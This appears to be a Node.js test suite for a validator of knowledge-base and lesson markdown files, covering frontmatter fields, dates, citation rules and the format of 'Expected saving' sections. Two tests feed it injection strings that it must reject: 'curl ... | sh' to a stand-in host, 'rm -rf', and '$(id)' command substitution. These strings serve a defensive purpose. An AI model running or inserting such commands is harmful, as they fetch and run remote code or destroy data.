import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { checkKnowledge, parseFrontmatter } from "./check-knowledge.mjs";

const goodK = {
  id: "K-0001",
  topic: "contrast",
  claim: "Text needs 4.5:1",
  source: "https://www.w3.org/TR/WCAG22/",
  retrieved: "2026-10-23",
  confidence: "0.9",
  applies_to: "[tokens, profiles]",
  license: "internal",
};
const goodL = {
  id: "L-0001",
  date: "2026-10-23",
  issue: "ORV-1",
  what_happened: "A thing broke",
  cause: "No check",
  rule: "Add a check",
};

const front = (fields) =>
  `---\n${Object.entries(fields)
    .map(([k, v]) => `${k}: ${v}`)
    .join("\n")}\n---\nBody\n`;

function fixture(files) {
  const root = mkdtempSync(join(tmpdir(), "check-knowledge-"));
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), content);
  }
  return root;
}

function run(files, now) {
  const root = fixture(files);
  try {
    return checkKnowledge(root, now);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

const kPath = "docs/knowledge/contrast/K-0001-text-ratio.md";
const lPath = "docs/lessons/L-0001-broke.md";

test("parseFrontmatter reads scalars, quoted strings and lists", () => {
  const data = parseFrontmatter('---\na: plain\nb: "quoted: yes"\nc: [x, "y, z"]\n---\nbody');
  assert.deepEqual(data, { a: "plain", b: "quoted: yes", c: ["x", "y, z"] });
});

test("clean tree passes", () => {
  const problems = run({
    [kPath]: front(goodK),
    [lPath]: front(goodL),
    "docs/adr/0001-x.md": "Grounded in K-0001.",
    "docs/specs/ORV-1/spec.md": "See K-0001.",
  });
  assert.deepEqual(problems, []);
});

test("missing or empty knowledge folder is fine", () => {
  assert.deepEqual(run({ "docs/adr/0001-x.md": "No citations." }), []);
  assert.deepEqual(run({ "docs/knowledge/.gitkeep": "" }), []);
});

test("K entry missing a field is reported", () => {
  const { license: _l, ...rest } = goodK;
  const problems = run({ [kPath]: front(rest) });
  assert.ok(problems.some((p) => p.startsWith(`${kPath}: `) && p.includes("license")));
});

test("K id must match the filename prefix", () => {
  const problems = run({ [kPath]: front({ ...goodK, id: "K-0002" }) });
  assert.ok(problems.some((p) => p.includes("does not match filename")));
});

test("K ids must be unique", () => {
  const problems = run({
    [kPath]: front(goodK),
    "docs/knowledge/other/K-0001-dup.md": front(goodK),
  });
  assert.ok(problems.some((p) => p.includes("duplicate id K-0001")));
});

test("retrieved must be a valid date", () => {
  for (const bad of ["2026-13-40", "yesterday", "2026-02-30"]) {
    const problems = run({ [kPath]: front({ ...goodK, retrieved: bad }) });
    assert.ok(
      problems.some((p) => p.includes("retrieved")),
      bad,
    );
  }
});

test("confidence must be a number in [0,1]", () => {
  for (const bad of ["high", "1.5", "-0.1", "[0.5]"]) {
    const problems = run({ [kPath]: front({ ...goodK, confidence: bad }) });
    assert.ok(
      problems.some((p) => p.includes("confidence")),
      bad,
    );
  }
});

test("source must be non-empty", () => {
  const problems = run({ [kPath]: front({ ...goodK, source: '""' }) });
  assert.ok(problems.some((p) => p.includes("source")));
});

test("L entry missing a field is reported", () => {
  const { rule: _r, ...rest } = goodL;
  const problems = run({ [lPath]: front(rest) });
  assert.ok(problems.some((p) => p.startsWith(`${lPath}: `) && p.includes("rule")));
});

test("L ids must be unique and match the filename", () => {
  const problems = run({
    [lPath]: front(goodL),
    "docs/lessons/L-0001-again.md": front(goodL),
    "docs/lessons/L-0003-x.md": front({ ...goodL, id: "L-0009" }),
  });
  assert.ok(problems.some((p) => p.includes("duplicate id L-0001")));
  assert.ok(problems.some((p) => p.includes("does not match filename")));
});

test("a K id cited in an ADR or spec must exist", () => {
  const problems = run({
    "docs/adr/0001-x.md": "Uses K-0042.",
    "docs/specs/ORV-1/spec.md": "Also K-0043.",
  });
  assert.ok(problems.some((p) => p.startsWith("docs/adr/0001-x.md: ") && p.includes("K-0042")));
  assert.ok(
    problems.some((p) => p.startsWith("docs/specs/ORV-1/spec.md: ") && p.includes("K-0043")),
  );
});

test("an ADR may not cite an entry below 0.7 confidence", () => {
  const files = {
    [kPath]: front({ ...goodK, confidence: "0.6" }),
    "docs/adr/0001-x.md": "Grounded in K-0001.",
  };
  const problems = run(files);
  assert.ok(problems.some((p) => p.startsWith("docs/adr/0001-x.md: ") && p.includes("0.7")));
});

test("a malformed file name under knowledge or lessons is reported, not skipped", () => {
  for (const path of [
    "docs/knowledge/contrast/K-1-short.md",
    "docs/knowledge/contrast/k-0001-lower.md",
    "docs/knowledge/contrast/K-0001-Upper_Case.md",
    "docs/knowledge/contrast/notes.md",
    "docs/lessons/L-0001.md",
    "docs/lessons/lesson.md",
  ]) {
    const problems = run({ [path]: front(goodK) });
    assert.ok(
      problems.some((p) => p.startsWith(`${path}: `) && p.includes("malformed file name")),
      path,
    );
  }
  assert.deepEqual(
    run({ "docs/knowledge/README.md": "x", "docs/knowledge/contrast/README.md": "x" }),
    [],
  );
});

test("confidence must be the raw, unquoted number", () => {
  for (const bad of ['" "', "0x1", '"0.9"', "1.5", ".5", "0.", "01"]) {
    const problems = run({ [kPath]: front({ ...goodK, confidence: bad }) });
    assert.ok(
      problems.some((p) => p.includes("confidence")),
      bad,
    );
  }
  for (const ok of ["0", "1", "1.0", "0.85"]) {
    assert.deepEqual(run({ [kPath]: front({ ...goodK, confidence: ok }) }), [], ok);
  }
});

test("the 0.7 floor applies to ADRs, specs and plans", () => {
  for (const path of ["docs/adr/0001-x.md", "docs/specs/ORV-1/spec.md", "docs/plans/p.md"]) {
    const problems = run({
      [kPath]: front({ ...goodK, confidence: "0.6" }),
      [path]: "Grounded in K-0001.",
    });
    assert.ok(
      problems.some((p) => p.startsWith(`${path}: `) && p.includes("0.7")),
      path,
    );
  }
});

test("a K id cited in plans must exist, and a lowercase id is malformed", () => {
  const problems = run({
    [kPath]: front(goodK),
    "docs/plans/p.md": "Cites K-0042 and k-0001.",
  });
  assert.ok(problems.some((p) => p.startsWith("docs/plans/p.md: ") && p.includes("K-0042")));
  assert.ok(problems.some((p) => p.startsWith("docs/plans/p.md: ") && p.includes("k-0001")));
});

test("topic must equal the parent folder", () => {
  const problems = run({ [kPath]: front({ ...goodK, topic: "other" }) });
  assert.ok(problems.some((p) => p.includes("topic other")));
});

test("license must be on the README list", () => {
  const bad = run({ [kPath]: front({ ...goodK, license: "W3C" }) });
  assert.ok(bad.some((p) => p.includes("license W3C")));
  const readme = "| `license` | How we may reuse: `internal`, `W3C` | `sources[].license` |\n";
  const files = {
    "docs/knowledge/README.md": readme,
    [kPath]: front({ ...goodK, license: "W3C" }),
  };
  assert.deepEqual(run(files), []);
  files[kPath] = front({ ...goodK, license: "MIT" });
  assert.ok(run(files).some((p) => p.includes("license MIT")));
});

test("lesson date must be a real date", () => {
  for (const bad of ["2026-02-30", "soon"]) {
    const problems = run({ [lPath]: front({ ...goodL, date: bad }) });
    assert.ok(
      problems.some((p) => p.includes("date ")),
      bad,
    );
  }
});

test("retrieved must not be in the future", () => {
  const problems = run({ [kPath]: front({ ...goodK, retrieved: "2999-01-01" }) });
  assert.ok(problems.some((p) => p.includes("in the future")));
});

test("the 0.7 floor also applies to lessons, context, rules and agents, in .md and .mdx", () => {
  for (const path of [
    "docs/lessons/L-0002-x.md",
    "docs/context/c.md",
    ".claude/rules/r.md",
    ".claude/agents/a.md",
    "docs/adr/0001-x.mdx",
  ]) {
    const problems = run({
      [kPath]: front({ ...goodK, confidence: "0.6" }),
      [path]: path.includes("lessons")
        ? front(goodL).replace("L-0001", "L-0002") + "K-0001"
        : "K-0001",
    });
    assert.ok(
      problems.some((p) => p.startsWith(`${path}: `) && p.includes("0.7")),
      path,
    );
  }
});

test("whitespace-only fields count as empty", () => {
  const problems = run({ [kPath]: front({ ...goodK, claim: '"   "' }) });
  assert.ok(problems.some((p) => p.includes("missing or empty field claim")));
});

test("a K entry directly under docs/knowledge is reported", () => {
  const path = "docs/knowledge/K-0001-text-ratio.md";
  const problems = run({ [path]: front({ ...goodK, topic: "knowledge" }) });
  assert.ok(problems.some((p) => p.startsWith(`${path}: `) && p.includes("topic folder")));
});

test("a K id written with a non-ASCII hyphen is reported", () => {
  for (const hyphen of ["‐", "‑", "‒", "–"]) {
    const problems = run({
      [kPath]: front(goodK),
      "docs/adr/0001-x.md": `Grounded in K${hyphen}0001.`,
    });
    assert.ok(
      problems.some((p) => p.startsWith("docs/adr/0001-x.md: ") && p.includes("non-ASCII hyphen")),
      JSON.stringify(hyphen),
    );
  }
});

test("a lesson dated after today is reported", () => {
  const problems = run({ [lPath]: front({ ...goodL, date: "2999-01-01" }) });
  assert.ok(problems.some((p) => p.startsWith(`${lPath}: `) && p.includes("in the future")));
});

test("a date is in the future only after the UTC date of now + 14 hours (pinned clock)", () => {
  const files = (date) => ({
    [kPath]: front({ ...goodK, retrieved: date }),
    [lPath]: front({ ...goodL, date }),
  });
  // 12:00 UTC on the 23rd: it is already the 24th at UTC+14, so the 24th is allowed.
  const noon = new Date("2026-10-23T12:00:00Z");
  assert.deepEqual(run(files("2026-10-24"), noon), []);
  const late = run(files("2026-10-25"), noon);
  assert.equal(late.filter((p) => p.includes("in the future")).length, 2);
  // 09:59 UTC on the 23rd: still the 23rd at UTC+14, so the 24th is in the future.
  const early = new Date("2026-10-23T09:59:00Z");
  assert.deepEqual(run(files("2026-10-23"), early), []);
  assert.equal(
    run(files("2026-10-24"), early).filter((p) => p.includes("in the future")).length,
    2,
  );
});

test("a non-.md file in docs/knowledge or docs/lessons is reported", () => {
  const problems = run({
    [kPath]: front(goodK),
    "docs/knowledge/contrast/K-0002-x.mdx": front({ ...goodK, id: "K-0002" }),
    "docs/lessons/L-0002-x.txt": "x",
    "docs/knowledge/.DS_Store": "x",
    "docs/lessons/.DS_Store": "x",
  });
  assert.ok(!problems.some((p) => p.includes(".DS_Store")));
  assert.ok(problems.some((p) => p.startsWith("docs/knowledge/contrast/K-0002-x.mdx: ")));
  assert.ok(problems.some((p) => p.startsWith("docs/lessons/L-0002-x.txt: ")));
});

test("the 0.7 floor also applies to skills and AGENTS.md", () => {
  const files = {
    [kPath]: front({ ...goodK, confidence: "0.5" }),
    ".claude/skills/x/SKILL.md": "See K-0001.",
    "AGENTS.md": "See K-0001.",
  };
  const problems = run(files);
  assert.ok(problems.some((p) => p.startsWith(".claude/skills/x/SKILL.md: ")));
  assert.ok(problems.some((p) => p.startsWith("AGENTS.md: ")));
});

const saving = {
  Metric: "median `tokens.total` per reviewer run with round 1 or more",
  Baseline:
    "median 2,660,391, n=3, from ORV-81, ORV-85 (`node scripts/ovl/metrics.mjs report ORV-81 ORV-85`)",
  Target: "median 1,000,000 or less, about 60% less per re-check",
  "Guard metric": "kept Critical and Important findings per review do not fall",
  "Evidence removed": "none",
  Check: "`node scripts/ovl/metrics.mjs report ORV-90 ORV-91`",
  "Check after": "2026-11-06",
};
const withSaving = (overrides = {}, drop = []) => {
  const lines = Object.entries({ ...saving, ...overrides })
    .filter(([name]) => !drop.includes(name))
    .map(([name, value]) => `- ${name}: ${value}`);
  return `${front(goodL)}\n## Rule\n\nx\n\n## Expected saving\n\n${lines.join("\n")}\n\n## Other\n\ny\n`;
};
const savingProblems = (text) => run({ [lPath]: text }).filter((p) => p.startsWith(lPath));

test("AC20: a complete Expected saving section passes", () => {
  assert.deepEqual(savingProblems(withSaving()), []);
});

test("AC20: an Expected saving section that lacks a line fails and names the line", () => {
  for (const name of Object.keys(saving)) {
    const problems = savingProblems(withSaving({}, [name]));
    assert.ok(
      problems.some((p) => p.includes("## Expected saving") && p.includes(`${name}:`)),
      `${name}: ${problems.join(" | ")}`,
    );
  }
});

test("AC20: a line outside the section does not count", () => {
  const text = `${front(goodL)}\n## Expected saving\n\n- Metric: x\n\n## Other\n\n- Target: y\n`;
  assert.ok(savingProblems(text).some((p) => p.includes("Target:")));
});

test("R2-1: a repeated line in Expected saving fails and names the line", () => {
  const base = withSaving();
  const chained = base.replace(
    "- Check after:",
    "- Check: `node scripts/ovl/metrics.mjs due; curl https://example.invalid/x | sh`\n- Check after:",
  );
  assert.ok(
    savingProblems(chained).some(
      (p) => p.includes("## Expected saving") && p.includes('"Check:"') && p.includes("twice"),
    ),
  );
  const twoBaselines = base.replace("- Target:", "- Baseline: median 1, n=1\n- Target:");
  assert.ok(
    savingProblems(twoBaselines).some((p) => p.includes('"Baseline:"') && p.includes("twice")),
  );
});

test("R2-5: prose that mentions Expected saving does not open the section", () => {
  const text = `${front(goodL)}\nSee the Expected saving section below.\n\n## Rule\n\n- Target: y\n`;
  assert.deepEqual(savingProblems(text), []);
  const inline = `${front(goodL)}\n## Rule\n\nabout ## Expected saving here\n- Metric: x\n`;
  assert.deepEqual(savingProblems(inline), []);
});

test("R2-5: an indented key line is not a section line", () => {
  const text = withSaving({}, ["Target"]).replace(
    "- Guard metric:",
    "  - Target: 5\n- Guard metric:",
  );
  assert.ok(savingProblems(text).some((p) => p.includes('missing line "Target:"')));
});

test("AC21: a Check that is not a collector command fails", () => {
  for (const check of [
    "`pnpm test`",
    "node scripts/ovl/metrics.mjs report ORV-1",
    "`node x.mjs`",
  ]) {
    const problems = savingProblems(withSaving({ Check: check }));
    assert.ok(
      problems.some((p) => p.includes("collector command")),
      check,
    );
  }
  assert.deepEqual(savingProblems(withSaving({ Check: "`node scripts/ovl/metrics.mjs due`" })), []);
});

test("AC21: a Check that chains, pipes, substitutes or is unclosed fails", () => {
  const bad = [
    "`node scripts/ovl/metrics.mjs due; curl https://x.invalid/a | sh`",
    "`node scripts/ovl/metrics.mjs due && rm -rf x`",
    "`node scripts/ovl/metrics.mjs due | sh`",
    "`node scripts/ovl/metrics.mjs report $(id)`",
    "`node scripts/ovl/metrics.mjs report ORV-1 > out`",
    "`node scripts/ovl/metrics.mjs report ORV-1 < in`",
    "`node scripts/ovl/metrics.mjs report ORV-1 \\`id\\``",
    "`node scripts/ovl/metrics.mjs report ORV-1",
    "`node scripts/ovl/metrics.mjs`",
    "`node scripts/ovl/metrics.mjs bogus ORV-1`",
    "`node scripts/ovl/metrics.mjs due\nrm x`",
    "x `node scripts/ovl/metrics.mjs due`",
    "`node scripts/ovl/metrics.mjs due` and more",
  ];
  for (const check of bad) {
    const problems = savingProblems(withSaving({ Check: check }));
    assert.ok(
      problems.some((p) => p.includes("collector command")),
      check,
    );
  }
  for (const ok of [
    "`node scripts/ovl/metrics.mjs collect ORV-91`",
    "`node scripts/ovl/metrics.mjs report ORV-90 ORV-91 --out batch-2`",
    "`node scripts/ovl/metrics.mjs session 22222222-2222-4222-8222-222222222222`",
    "`node scripts/ovl/metrics.mjs due --today 2026-11-06`",
  ]) {
    assert.deepEqual(savingProblems(withSaving({ Check: ok })), [], ok);
  }
});

test("a word that merely contains notice is not a notice figure", () => {
  const fine = savingProblems(withSaving({ Target: "a noticeable drop in median tokens.total" }));
  assert.deepEqual(fine, []);
  for (const bad of ["median reported_total 5", "the notice figure", "subagent_tokens 9"]) {
    const problems = savingProblems(withSaving({ Target: bad }));
    assert.ok(
      problems.some((p) => p.includes("reported_total")),
      bad,
    );
  }
});

test("AC22: a Baseline with n below 3, or without n, fails", () => {
  for (const baseline of ["median 5, n=2", "median 5, n=0", "median 5"]) {
    const problems = savingProblems(withSaving({ Baseline: baseline }));
    assert.ok(
      problems.some((p) => p.includes("n of 3 or more")),
      baseline,
    );
  }
  assert.deepEqual(savingProblems(withSaving({ Baseline: "median 5, n=12" })), []);
});

test("an Expected saving metric must not count reported_total or a notice figure", () => {
  for (const name of ["Metric", "Baseline", "Target"]) {
    for (const bad of ["median reported_total, n=3", "the notice figure, n=3"]) {
      const problems = savingProblems(withSaving({ [name]: bad }));
      assert.ok(
        problems.some((p) => p.includes("tokens.total") && p.includes(name)),
        `${name} ${bad}`,
      );
    }
  }
});

test("Check after must be a real date", () => {
  for (const date of ["2026-13-40", "soon", "2026-02-30"]) {
    const problems = savingProblems(withSaving({ "Check after": date }));
    assert.ok(
      problems.some((p) => p.includes("Check after")),
      date,
    );
  }
});
